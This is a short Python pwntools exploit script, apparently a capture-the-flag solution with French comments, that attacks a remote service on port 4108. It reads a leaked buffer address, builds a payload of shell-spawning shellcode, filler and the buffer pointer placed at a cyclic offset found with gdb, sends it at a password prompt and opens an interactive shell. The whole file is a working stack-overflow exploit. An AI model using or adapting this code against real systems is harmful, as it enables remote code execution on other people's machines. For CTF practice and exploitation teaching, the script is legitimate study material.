#!/usr/bin/env python3
from pwn import *
context.update(arch='amd64', timeout=1)

p = remote("cytech.tcdn.casa", 4108)

# get buffer address
p.recvuntil(b"0x") # on recoit jusqu'a voir 0x
ptr_repr = p.recvlineS() # on recup le reste de la ligne, qui doit etre une vleur hexa
ptr = int(ptr_repr, 16) # on recupere l'int correspondant a la valeur hexa

# generate flat payload (shellcode + filling + buffer ptr)
log.info("Payload:")
# flat est pratique pour generer des payloads facilement.
# ici je genere un flat (par default, rempli par un cyclic)
payload = flat({
    0: asm(shellcraft.sh()), # a l'offset 0 de mon flat, je veux le shellcode
    "jaab": ptr, # a l'adresse jaab (car quand j'ai essaye avec gdb de passer un cyclic trop long, la valeur de retour commencait pat jaab, c'est un moyen plus rapide de faire le payload sans avoir a compter a chaque fois.
    })
log.hexdump(payload)
p.sendlineafter(b"mot de passe:\n", payload)

p.interactive()